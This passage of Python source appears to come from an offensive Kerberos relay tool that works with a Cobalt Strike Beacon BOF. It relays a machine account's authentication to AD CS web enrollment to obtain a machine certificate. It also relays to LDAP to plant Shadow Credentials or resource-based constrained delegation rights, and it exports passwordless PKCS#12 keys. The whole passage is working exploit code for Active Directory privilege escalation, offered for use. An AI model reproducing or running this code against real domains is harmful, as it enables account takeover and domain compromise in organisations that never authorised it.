    discard IIS's connection-bound authentication state.
    """
    log = (lambda message: print(f"[*] {message}", flush=True)) if options.verbose else (lambda message: None)
    client_trace = trace_name(options.machine)
    server_trace = trace_name(options.adcs_host)
    use_tls = getattr(options, "adcs_tls", False)
    scheme = "HTTPS" if use_tls else "HTTP"
    log(
        f"Opening one persistent {scheme} connection to "
        f"{options.adcs_address}:{options.adcs_port} with Host {options.adcs_host}"
    )
    http = RawHttpConnection(
        options.adcs_host, options.adcs_address, options.adcs_port,
        use_tls,
    )
    try:
        log(f"Priming IIS with an unauthenticated GET {options.auth_path}")
        probe = http.request("GET", options.auth_path)
        if probe.status != 401:
            raise RelayError(f"initial ADCS probe returned HTTP {probe.status}")
        log("IIS returned HTTP 401 with Negotiate; awaiting BOF SPNEGO leg 1")
        # Windows/IIS decides the leg count. Loop until the server returns 200
        # instead of assuming a two- or three-message Kerberos exchange.
        leg = 0
        ntlm_over_negotiate = False
        while True:
            kind, token = channel.receive({MSG_CLIENT_AUTH_TOKEN, MSG_ERROR})
            if kind == MSG_ERROR:
                raise RelayError("BOF rejected relay continuation: " + token.decode("utf-8", errors="replace"))
            leg += 1
            if leg == 1:
                ntlm_over_negotiate = token.startswith(b"NTLMSSP\x00")
            log(f"Received opaque SPNEGO leg {leg} from {options.machine}; relaying it to {options.adcs_host}{options.auth_path}")
            if options.trace_spnego:
                print_spnego(f"{client_trace}_TO_{server_trace}", leg, token)
            wire_token = wrap_ntlm_negotiate(token, leg == 1) if ntlm_over_negotiate else token
            response = http.request("GET", options.auth_path, authorization=wire_token)
            if response.status == 401:
                continuation = authentication_blob(response)
                if not continuation:
                    raise RelayError("IIS returned a bare Negotiate challenge")
                if ntlm_over_negotiate:
                    continuation = unwrap_ntlm_negotiate(continuation)
                inner, error_code = kerberos_inner(continuation)
                reason = f", KRB-ERROR {error_code}" if error_code is not None else ""
                log(
                    f"IIS continuation analysis: negState={spnego_state(continuation)}, "
                    f"inner={inner}{reason}; an AP-REP with accept-incomplete is the normal mutual-authentication step"
                )
                if options.trace_spnego:
                    print_spnego(f"{server_trace}_TO_{client_trace}", leg, continuation)
                log(f"IIS requested continuation; returning its opaque SPNEGO response to {options.machine} for leg {leg + 1}")
                # Kerberos/SPNEGO continuations remain byte-for-byte opaque.
                # Only the explicit raw-NTLM compatibility branch above
                # removes the HTTP Negotiate wrapper for RPC's NTLM provider.
                channel.send(MSG_SERVER_AUTH_TOKEN, continuation)
                continue
            if response.status != 200:
                # This IIS build returns 500 from the classic ASP landing page
                # while its WWW-Authenticate token declares accept-completed.
                # That SPNEGO state is authoritative; certificate submission
                # on this same connection remains the end-to-end proof.
                final_token = authentication_blob(response)
                if (response.status != 500 or not final_token or
                        spnego_state(final_token) != "accept-completed"):
                    raise RelayError(
                        f"IIS authentication returned HTTP {response.status}: "
                        f"{http_error_detail(response.body)}; challenges="
                        f"{response.headers.get('www-authenticate', [])}"
                    )
                log(
                    "IIS returned SPNEGO accept-completed with HTTP 500; "
                    "continuing enrollment on the authenticated connection"
                )
            final_token = authentication_blob(response)
            if options.trace_spnego and final_token:
                print_spnego(f"{server_trace}_FINAL", leg, final_token)
            log("IIS returned HTTP 200; the persistent HTTP connection is authenticated as the relayed machine account")
            channel.send(MSG_AUTH_OK)
            channel.bof_released = True
            log("Released the BOF at authenticated-HTTP success; enrollment now continues only in Python")
            cookie = response.first("set-cookie")
            return enroll(
                http, options.domain, options.machine, options.template,
                options.enroll_path, options.certificate_path, cookie, log,
            )
    finally:
        http.close()


def domain_dn(domain: str) -> str:
    """Convert the operator-supplied DNS domain to its LDAP naming context."""
    labels = domain.strip(".").split(".")
    if not labels or any(not label or "," in label or "=" in label for label in labels):
        raise RelayError("invalid DNS domain")
    return ",".join(f"DC={label}" for label in labels)


def default_computer_dn(options: argparse.Namespace) -> str:
    """Resolve the common default container without an authenticated query."""
    if options.ldap_target_dn:
        return options.ldap_target_dn
    name = (options.ldap_target or options.machine).rstrip("$")
    if any(char in name for char in ",=+<>#;\\"):
        raise RelayError("--ldap-target-dn is required for a non-simple computer name")
    return f"CN={name},CN=Computers,{domain_dn(options.domain)}"


def ldap_modify_request(
    dn: str, attribute: str, operation: int, values: list[bytes],
) -> tuple[int, bytes]:
    partial_attribute = (
        ber_tlv(0x04, attribute.encode("ascii"))
        + ber_tlv(0x31, b"".join(ber_tlv(0x04, value) for value in values))
    )
    change = ber_tlv(
        0x30,
        ber_tlv(0x0A, bytes([operation])) + ber_tlv(0x30, partial_attribute),
    )
    return 0x66, ber_tlv(0x04, dn.encode("utf-8")) + ber_tlv(0x30, change)


def prepare_shadow_credential(
    options: argparse.Namespace,
) -> tuple[list[tuple[int, bytes]], CertificateBundle, str]:
    """Build one computer-SELF-valid NGC KeyCredential and ModifyRequest."""
    from impacket.examples.ntlmrelayx.utils import shadow_credentials

    target = options.ldap_target or f"{options.machine.rstrip('$')}$"
    dn = default_computer_dn(options)
    # MS-ADTS requires computer NGC keys to use a 2048-bit BCRYPT RSA public
    # key.  Optional metadata is omitted to honor the narrow SELF validated
    # write while still retaining everything needed for PKINIT.
    key, certificate = shadow_credentials.createSelfSignedX509Certificate(
        target, kSize=2048
    )
    public_key = shadow_credentials.KeyCredential.raw_public_key(key)

    def key_entry(identifier: int, data: bytes) -> bytes:
        return struct.pack("<HB", len(data), identifier) + data

    key_id = hashlib.sha256(public_key).digest()
    key_credential = (
        struct.pack("<I", 0x200)
        + key_entry(0x01, key_id)
        + key_entry(0x03, public_key)
        + key_entry(0x04, b"\x01")
        + key_entry(0x05, b"\x00")
    )
    value = shadow_credentials.toDNWithBinary2String(
        key_credential, dn
    ).encode("ascii")
    bundle = CertificateBundle(
        certificate, key, f"shadow-{key_id.hex()[:12]}"
    )
    return (
        [ldap_modify_request(dn, "msDS-KeyCredentialLink", 0, [value])],
        bundle,
        target,
    )


def prepare_rbcd_pipeline(
    options: argparse.Namespace,
) -> tuple[list[tuple[int, bytes]], RbcdUpdate]:
    """Build one exact-DN RBCD write that needs no signed post-bind search."""
    if not options.ldap_target_dn:
        raise RelayError("--ldap-target-dn is required for direct RBCD")
    if not options.delegate_sid:
        raise RelayError("--delegate-sid is required for direct RBCD")
    from impacket.ldap import ldaptypes

    # RBCD is an NT security descriptor. Grant only the operator-supplied
    # principal, rather than installing a permissive NULL DACL.
    descriptor = ldaptypes.SR_SECURITY_DESCRIPTOR()
    descriptor["Revision"] = b"\x01"
    descriptor["Sbz1"] = b"\x00"
    descriptor["Control"] = 0x8004
    owner = ldaptypes.LDAP_SID()
    owner.fromCanonical("S-1-5-32-544")
    descriptor["OwnerSid"] = owner
    descriptor["GroupSid"] = b""
    descriptor["Sacl"] = b""

    dacl = ldaptypes.ACL()
    dacl["AclRevision"] = 4
    dacl["Sbz1"] = 0
    dacl["Sbz2"] = 0
    ace = ldaptypes.ACE()
    ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    ace["AceFlags"] = 0
    ace["Ace"] = ldaptypes.ACCESS_ALLOWED_ACE()
    # This is the generic all-rights mask used by standard RBCD tooling.
    ace["Ace"]["Mask"] = ldaptypes.ACCESS_MASK()
    ace["Ace"]["Mask"]["Mask"] = 0x1F01FF
    trustee = ldaptypes.LDAP_SID()
    trustee.fromCanonical(options.delegate_sid)
    ace["Ace"]["Sid"] = trustee
    # AD dispatches pipelined requests on separate workers. Repeating the same
    # trustee ACE gives the final SASL bind time to commit before this write's
    # authorization check without granting any additional principal. Shorter
    # descriptors intermittently reach that check while the bind is pending.
    dacl.aces = [ace] * 8
    descriptor["Dacl"] = dacl

    request = ldap_modify_request(
        options.ldap_target_dn,
        "msDS-AllowedToActOnBehalfOfOtherIdentity",
        2,
        [descriptor.getData()],
    )
    target = options.ldap_target or f"{options.machine.rstrip('$')}$"
    delegate = options.delegate_account or "controlled principal"
    return [request], RbcdUpdate(target, delegate, options.delegate_sid, False)


def collect_pipelined_attack(
    ldap: RawLdapConnection, ids: list[tuple[int, int]],
    log: Callable[[str], None],
) -> str:
    """Validate each ordered response already queued behind the final bind."""
    identity = ""
    for index, (message_id, expected_tag) in enumerate(ids):
        operation_tag, operation = ldap_message(ldap._response(), message_id)
        if operation_tag != expected_tag:
            raise RelayError(
                f"pipelined LDAP response {index + 1} had tag 0x{operation_tag:02x}"
            )
        result_code, diagnostic = ldap_result(operation)
        if result_code != 0:
            detail = f": {diagnostic}" if diagnostic else ""
            raise RelayError(
                f"pipelined LDAP operation {index + 1} failed with result "
                f"{result_code}{detail}"
            )
        if operation_tag == 0x78:
            _tag, _result, offset = ber_element(operation, 0)
            _tag, _matched, offset = ber_element(operation, offset)
            _tag, _diagnostic, offset = ber_element(operation, offset)
            while offset < len(operation):
                tag, value, offset = ber_element(operation, offset)
                if tag == 0x8B:
                    identity = value.decode("utf-8", errors="replace")
            log(f"Pipelined LDAP identity: {identity or '<empty>'}")
    return identity


def run_ldap_session(channel: RecordChannel, options: argparse.Namespace):
    """Relay one LDAP SASL exchange and apply its selected directory action."""
    log = (lambda message: print(f"[*] {message}", flush=True)) if options.verbose else (lambda message: None)
    client_trace = trace_name(options.machine)
    server_trace = trace_name(options.ldap_host)
    prepared_shadow = (
        prepare_shadow_credential(options)
        if options.mode == "shadowcred" else None
    )
    prepared_rbcd = (
        prepare_rbcd_pipeline(options)
        if options.mode == "rbcd" and options.delegate_sid else None
    )
    log(f"Opening one persistent TCP connection to {options.ldap_address}:{options.ldap_port} for ldap/{options.ldap_host}")
    preconnected = None
    if options.ldap_socks_port:
        preconnected = socks5_connect(
            options.ldap_socks_address, options.ldap_socks_port,
            options.ldap_address, options.ldap_port,
        )
    ldap = RawLdapConnection(
        options.ldap_address,
        options.ldap_port,
        options.ldap_host if options.ldap_tls else None,
        preconnected,
    )
    try:
        leg = 0
        while True:
            kind, token = channel.receive({MSG_CLIENT_AUTH_TOKEN, MSG_ERROR})
            if kind == MSG_ERROR:
                raise RelayError("BOF rejected relay continuation: " + token.decode("utf-8", errors="replace"))
            leg += 1
            log(f"Received opaque SPNEGO leg {leg}; sending an LDAP SASL GSS-SPNEGO BindRequest")
            if options.trace_spnego:
                print_spnego(f"{client_trace}_TO_{server_trace}", leg, token)
            pipelined_ids = []
            pipeline_bundle = None
            pipeline_target = None
            pipeline_rbcd = None
            if leg == 2 and options.mode == "shadowcred":
                requests, pipeline_bundle, pipeline_target = prepared_shadow
                response, pipelined_ids = ldap.bind_with_prefetched_requests(
                    ldap_kerberos_token(token, leg), requests
                )
            elif leg == 2 and prepared_rbcd:
                requests, pipeline_rbcd = prepared_rbcd
                response, pipelined_ids = ldap.bind_with_prefetched_requests(
                    ldap_kerberos_token(token, leg), requests
                )
            else:
                response = ldap.bind(ldap_kerberos_token(token, leg))
            log(
                f"LDAP bind leg {leg}: result={response.result_code}, "
                f"serverSaslCreds={len(response.server_credentials or b'')} bytes"
            )
            if response.result_code == 14:  # saslBindInProgress
                if not response.server_credentials:
                    raise RelayError("LDAP requested SASL continuation without serverSaslCreds")
                continuation = ldap_rpc_continuation(response.server_credentials)
                if options.trace_spnego:
                    print_spnego(f"{server_trace}_TO_{client_trace}", leg, continuation)
                channel.send(MSG_SERVER_AUTH_TOKEN, continuation)
                continue
            if response.result_code != 0:
                detail = f": {response.diagnostic}" if response.diagnostic else ""
                raise RelayError(f"LDAP SASL bind failed with result {response.result_code}{detail}")
            if options.trace_spnego and response.server_credentials:
                print_spnego(f"{server_trace}_FINAL", leg, response.server_credentials)
            log("LDAP final bind succeeded; validating the queued directory write")
            if pipelined_ids:
                collect_pipelined_attack(ldap, pipelined_ids, log)
                if pipeline_bundle:
                    print(f"[+] Added Shadow Credential to {pipeline_target}", flush=True)
                    channel.send(MSG_AUTH_OK)
                    channel.bof_released = True
                    return pipeline_bundle
                print(
                    f"[+] RBCD delegate added: {pipeline_rbcd.delegate} "
                    f"({pipeline_rbcd.sid}) -> {pipeline_rbcd.target}",
                    flush=True,
                )
                channel.send(MSG_AUTH_OK)
                channel.bof_released = True
                return pipeline_rbcd
            raise RelayError("LDAP completed without the queued directory write")
    finally:
        ldap.close()


def machine_schannel_context(bundle: CertificateBundle) -> ssl.SSLContext:
    """Load an issued machine identity into TLS without retaining key files.

    Python's OpenSSL binding accepts client keys only by filename. Linux memfd
    paths satisfy that API while keeping both PEM values anonymous and
    automatically destroying them as soon as the SSLContext has copied them.
    """
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    cert_fd = os.memfd_create("krbrelay-schannel-cert", os.MFD_CLOEXEC)
    key_fd = os.memfd_create("krbrelay-schannel-key", os.MFD_CLOEXEC)
    try:
        os.write(cert_fd, bundle.certificate.public_bytes(serialization.Encoding.PEM))
        os.write(key_fd, bundle.private_key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption(),
        ))
        context.load_cert_chain(f"/proc/self/fd/{cert_fd}", f"/proc/self/fd/{key_fd}")
    finally:
        os.close(cert_fd)
        os.close(key_fd)
    return context


def run_schannel_ldap(bundle: CertificateBundle, options: argparse.Namespace):
    """Use the relayed machine certificate for a true LDAPS directory write.

    The HTTP relay has already completed and the BOF has returned. AD maps the
    client certificate during the TLS handshake, so no SASL integrity layer is
    negotiated on top of LDAPS and ordinary RFC4511 requests are valid.
    """
    log = (lambda message: print(f"[*] {message}", flush=True)) if options.verbose else (lambda message: None)
    if options.mode == "shadowcred":
        requests, result, target = prepare_shadow_credential(options)
    else:
        requests, result = prepare_rbcd_pipeline(options)
        target = result.target

    preconnected = None
    if options.ldap_socks_port:
        preconnected = socks5_connect(
            options.ldap_socks_address, options.ldap_socks_port,
            options.ldap_address, options.ldap_port,
        )
    log(
        f"Opening LDAPS connection to {options.ldap_address}:{options.ldap_port} "
        "with the relayed machine certificate"
    )
    ldap = RawLdapConnection(
        options.ldap_address, options.ldap_port, options.ldap_host,
        preconnected, machine_schannel_context(bundle),
    )
    try:
        # Query the authorization identity first so a certificate that failed
        # AD's Schannel mapping cannot be mistaken for an authorized write.
        operations = [(
            0x77,
            ber_tlv(0x80, b"1.3.6.1.4.1.4203.1.11.3"),
        )] + requests
        packet = bytearray()
        ids = []
        for operation_tag, body in operations:
            ldap.message_id += 1
            ids.append((ldap.message_id, operation_tag + 1))
            packet.extend(ber_tlv(
                0x30,
                ber_integer(ldap.message_id) + ber_tlv(operation_tag, body),
            ))
        ldap.sock.sendall(packet)
        identity = collect_pipelined_attack(ldap, ids, log)
        expected_identity = (
            f"u:{options.domain.split('.')[0]}\\{options.machine.rstrip('$')}$"
        )
        if identity.lower() != expected_identity.lower():
            raise RelayError(
                f"LDAPS mapped the certificate to unexpected identity {identity or '<empty>'}"
            )
        if options.mode == "shadowcred":
            print(f"[+] Added Shadow Credential to {target} over LDAPS", flush=True)
        else:
            print(
                f"[+] RBCD delegate added over LDAPS: {result.delegate} "
                f"({result.sid}) -> {target}",
                flush=True,
            )
        return result
    finally:
        ldap.close()


# ---------------------------------------------------------------------------
# Optional external DCE/RPC association forwarders
# ---------------------------------------------------------------------------
def socket_read_exact(sock: socket.socket, length: int) -> bytes:
    """Read one fixed-size SOCKS field without assuming recv boundaries."""
    value = bytearray()
    while len(value) < length:
        part = sock.recv(length - len(value))
        if not part:
            raise RelayError("short SOCKS5 response")
        value.extend(part)
    return bytes(value)


def socks5_connect(proxy_address: str, proxy_port: int, target_address: str,
                   target_port: int) -> socket.socket:
    """Open one unauthenticated SOCKS5 stream to a target-local RPC port."""
    result = socket.create_connection((proxy_address, proxy_port), timeout=10)
    try:
        result.sendall(b"\x05\x01\x00")
        if socket_read_exact(result, 2) != b"\x05\x00":
            raise RelayError("SOCKS5 proxy did not accept no-authentication mode")
        encoded_address = target_address.encode("idna")
        if not 1 <= len(encoded_address) <= 255:
            raise RelayError("SOCKS5 target address must be 1..255 encoded bytes")
        request = (
            b"\x05\x01\x00\x03" + bytes([len(encoded_address)])
            + encoded_address + target_port.to_bytes(2, "big")
        )
        result.sendall(request)
        version, status, reserved, address_type = socket_read_exact(result, 4)
        if version != 5 or reserved != 0 or status != 0:
            raise RelayError(f"SOCKS5 connect failed with status {status}")
        if address_type == 1:
            socket_read_exact(result, 4)
        elif address_type == 3:
            socket_read_exact(result, socket_read_exact(result, 1)[0])
        elif address_type == 4:
            socket_read_exact(result, 16)
        else:
            raise RelayError("SOCKS5 proxy returned an invalid address type")
        socket_read_exact(result, 2)
        result.settimeout(None)
        return result
    except Exception:
        result.close()
        raise


# ---------------------------------------------------------------------------
# CLI validation and listener lifecycle
# ---------------------------------------------------------------------------
def parse_args(argv: list[str]) -> argparse.Namespace:
    """Declare the HTTP or LDAP target and the local KRB1 bridge."""
    parser = argparse.ArgumentParser()
    parser.add_argument("--listen", default="127.0.0.1")
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--allow", default="127.0.0.1")
    parser.add_argument("--mode", choices=("adcs", "shadowcred", "rbcd"), default="adcs")
    parser.add_argument("--adcs-host", help="HTTP Host header and service-SPN hostname")
    parser.add_argument("--adcs-address", help="HTTP target address")
    parser.add_argument("--adcs-port", type=int)
    parser.add_argument("--adcs-tls", action="store_true", help="use HTTPS for Web Enrollment")
    parser.add_argument("--auth-path", default="/certsrv/")
    parser.add_argument("--enroll-path", default="/certsrv/certfnsh.asp")
    parser.add_argument("--certificate-path", default="/certsrv/certnew.cer")
    parser.add_argument("--ldap-host", help="LDAP service-SPN hostname")
    parser.add_argument("--ldap-address", help="LDAP target address")
    parser.add_argument("--ldap-port", type=int)
    parser.add_argument("--ldap-socks-address", default="127.0.0.1")
    parser.add_argument("--ldap-socks-port", type=int)
    parser.add_argument("--ldap-tls", action="store_true", help="wrap direct LDAP in TLS")
    parser.add_argument(
        "--schannel-bootstrap", action="store_true",
        help="relay to HTTPS, then use the issued machine identity on LDAPS",
    )
    parser.add_argument("--ldap-target", help="target account (default: MACHINE$)")
    parser.add_argument("--ldap-target-dn", help="exact target DN")
    parser.add_argument("--delegate-account", help="controlled SPN account granted RBCD rights")
    parser.add_argument("--delegate-sid", help="SID granted RBCD rights")
    parser.add_argument("--domain")
    parser.add_argument("--machine")
    parser.add_argument("--template")
    parser.add_argument("--quiet", action="store_false", dest="verbose")
    parser.add_argument("--trace-spnego", action="store_true")
    parser.add_argument("--export-pfx-b64", action="store_true")
    parser.add_argument("--pfx-out", metavar="PATH")
    parser.add_argument("--count", type=int, default=1, help="bridge sessions to accept")
    return parser.parse_args(argv)

def pfx_output_path(bundle: CertificateBundle, options: argparse.Namespace) -> Optional[str]:
    """Resolve a collision-free proof path, including request-ID templates."""
    configured = options.pfx_out
    if options.export_pfx_b64 and not configured:
        configured = f"{options.machine}-machine.pfx"
    if not configured:
        return None
    try:
        configured = configured.format(request_id=bundle.request_id)
    except (KeyError, ValueError) as exc:
        raise RelayError(f"invalid --pfx-out template: {exc}") from exc
    if getattr(options, "count", 1) > 1 and "{request_id}" not in (options.pfx_out or ""):
        stem, extension = os.path.splitext(configured)
        configured = f"{stem}-{bundle.request_id}{extension}"
    return os.path.abspath(configured)


def publish_bundle(bundle: CertificateBundle, options: argparse.Namespace) -> None:
    """Serialize one verified enrollment without overwriting multi-run proofs."""
    identity = options.machine
    label = "Machine certificate"
    if options.mode == "shadowcred":
        identity = options.ldap_target or f"{options.machine.rstrip('$')}$"
        label = "Shadow Credential"
    pfx_path = pfx_output_path(bundle, options)
    if not (options.export_pfx_b64 or pfx_path):
        print(f"[+] {label} key pair acquired ({bundle.request_id})", flush=True)
        return
    pfx = serialize_pfx(bundle, identity)
    if pfx_path:
        create_mode = os.O_EXCL if getattr(options, "count", 1) > 1 else os.O_TRUNC
        descriptor = os.open(pfx_path, os.O_WRONLY | os.O_CREAT | create_mode, 0o600)
        with os.fdopen(descriptor, "wb") as output:
            output.write(pfx)
        print(f"[+] Saved passwordless {label.lower()} PKCS#12 to {pfx_path}", flush=True)
    if options.export_pfx_b64:
        # An export needs a reconstruction destination even if no local save
        # was requested. pfx_output_path supplies that default above.
        print_pfx(pfx, options, pfx_path or os.path.abspath(f"{options.machine}-machine.pfx"))
    if options.mode == "adcs":
        print(f"[+] Machine certificate acquired and key pair verified (request {bundle.request_id})", flush=True)
    else:
        print(f"[+] Shadow Credential key pair acquired ({bundle.request_id})", flush=True)


def main(argv: list[str]) -> int:
    """Accept the requested number of authorized bridge peers."""
    options = parse_args(argv)
    if options.adcs_port is None:
        options.adcs_port = 443 if options.adcs_tls else 80
    if options.ldap_port is None:
        options.ldap_port = 636 if options.ldap_tls else 389
    if options.mode != "adcs" and options.ldap_tls and not options.schannel_bootstrap:
        raise SystemExit(
            "direct Kerberos SASL over LDAPS is incompatible with the RPC "
            "integrity layer; add --schannel-bootstrap and HTTPS options"
        )
    if options.schannel_bootstrap:
        if options.mode == "adcs":
            raise SystemExit("--schannel-bootstrap requires shadowcred or rbcd mode")
        if not options.adcs_tls or not options.ldap_tls:
            raise SystemExit("--schannel-bootstrap requires --adcs-tls and --ldap-tls")
        required = (
            "adcs_host", "adcs_address", "template", "ldap_host",
            "ldap_address", "domain", "machine",
        )
        for path in ("auth_path", "enroll_path", "certificate_path"):
            if not getattr(options, path).startswith("/"):
                raise SystemExit(f"--{path.replace('_', '-')} must be an absolute path")
        if options.mode == "shadowcred" and not (options.pfx_out or options.export_pfx_b64):
            raise SystemExit("shadowcred mode requires --pfx-out or --export-pfx-b64")
        if options.mode == "rbcd" and not options.delegate_sid:
            raise SystemExit("rbcd mode requires --delegate-sid")
    elif options.mode == "adcs":
        required = ("adcs_host", "adcs_address", "domain", "machine", "template")
        for path in ("auth_path", "enroll_path", "certificate_path"):
            if not getattr(options, path).startswith("/"):
                raise SystemExit(f"--{path.replace('_', '-')} must be an absolute path")
    else:
        required = ("ldap_host", "ldap_address", "domain", "machine")
        if options.mode == "shadowcred" and not (options.pfx_out or options.export_pfx_b64):
            raise SystemExit("shadowcred mode requires --pfx-out or --export-pfx-b64")
        if options.mode == "rbcd" and not options.delegate_sid:
            raise SystemExit("rbcd mode requires --delegate-sid")
    for name in required:
        if not getattr(options, name):
            raise SystemExit(f"--{name.replace('_', '-')} is required in {options.mode} mode")

    ports = [options.port, options.adcs_port, options.ldap_port]
    if options.ldap_socks_port is not None:
        ports.append(options.ldap_socks_port)
    if any(not 1 <= value <= 65535 for value in ports):
        raise SystemExit("TCP ports must be between 1 and 65535")
    if options.count < 1:
        raise SystemExit("--count must be at least 1")

    allowed_addresses = {
        item[4][0] for item in socket.getaddrinfo(
            options.allow, None, socket.AF_INET, socket.SOCK_STREAM,
        )
    }
    service_spn = (
        f"http/{options.adcs_host}"
        if options.mode == "adcs" or options.schannel_bootstrap
        else f"ldap/{options.ldap_host}"
    )
    print(
        f"[*] Matching Beacon command: krbrelay {options.port} "
        f"{service_spn} <RPC_ENDPOINT>", flush=True,
    )

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((options.listen, options.port))
        listener.listen(1)
        print(f"[*] Awaiting {options.machine} relay on {options.listen}:{options.port}", flush=True)
        failed = False
        for session_number in range(1, options.count + 1):
            client, peer = listener.accept()
            with client:
                channel = RecordChannel(client)
                if peer[0] not in allowed_addresses:
                    print("[-] Rejected unauthorized bridge peer", flush=True)
                    failed = True
                    continue
                if options.verbose:
                    print(
                        f"[+] Accepted authorized bridge connection "
                        f"{session_number}/{options.count} from {peer[0]}", flush=True,
                    )
                try:
                    if options.schannel_bootstrap:
                        requested_mode = options.mode
                        options.mode = "adcs"
                        try:
                            machine_bundle = run_session(channel, options)
                        finally:
                            options.mode = requested_mode
                        outcome = run_schannel_ldap(machine_bundle, options)
                    else:
                        outcome = (
                            run_session(channel, options)
                            if options.mode == "adcs" else run_ldap_session(channel, options)
                        )
                    if options.mode != "rbcd":
                        publish_bundle(outcome, options)
                    print(
                        "[+] " + ("RBCD" if options.mode == "rbcd" else
                                   "Shadow Credentials" if options.mode == "shadowcred" else
                                   "AD CS") + " relay completed",
                        flush=True,
                    )
                except (RelayError, OSError, ValueError, TypeError) as exc:
                    if not channel.bof_released:
                        try:
                            channel.send(MSG_ERROR, str(exc).encode("utf-8")[:MAX_ERROR])
                        except (OSError, RelayError):
                            pass
                    print(f"[-] Relay failed: {exc}", flush=True)
                    failed = True
        return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
